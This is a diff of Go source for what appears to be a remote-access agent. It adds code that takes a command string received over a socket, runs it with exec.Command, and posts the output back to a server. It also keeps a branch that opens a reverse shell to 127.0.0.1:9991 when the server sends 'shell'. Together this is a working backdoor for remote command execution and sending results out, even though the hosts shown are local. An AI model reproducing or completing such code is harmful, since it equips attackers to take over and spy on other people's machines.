@@ -47,7 +47,7 @@ func (cli *Client) getHostName() {
     cli.Hostname, _ = os.Hostname()
 }
 
-// Debug function that generates random numbers to use in Port
+// Function that generates random numbers to use in Port
 func randInt(min int, max int) int {
     return min + rand.Intn(max-min)
 }
@@ -122,9 +122,9 @@ type Data struct {
     Time    string    `json:"time"`
 }
 
-//curl -X POST http://localhost:8080 -H 'Content-Type: application/json' -d '{"command":"my command","result":"my result", "time":"my time"}'
 
 // Function to send request to server API
+// not used for now
 func respondToServer(command, result string) error {
     data := &Data{
         Command:  command,
@@ -183,7 +183,20 @@ func getCommands(client Client, clientSocket net.Listener) error {
             return err
         }
 
-        // TODO: I was here
+        // If I decide to execute the command and respond to the server webserver with a POST
+        // =====================================================================================
+        // Executes command
+        command := string(serverCommand[:serverCommandLen])
+        out, err := exec.Command(command).Output()
+
+        if err != nil {
+            log.Fatal(err)
+        }
+
+        respondToServer(command, string(out))
+        // =====================================================================================
+
+        // If command is shell then connect to the server nc
         if string(serverCommand[:serverCommandLen]) == "shell" {
             reverse("127.0.0.1:9991")
         }
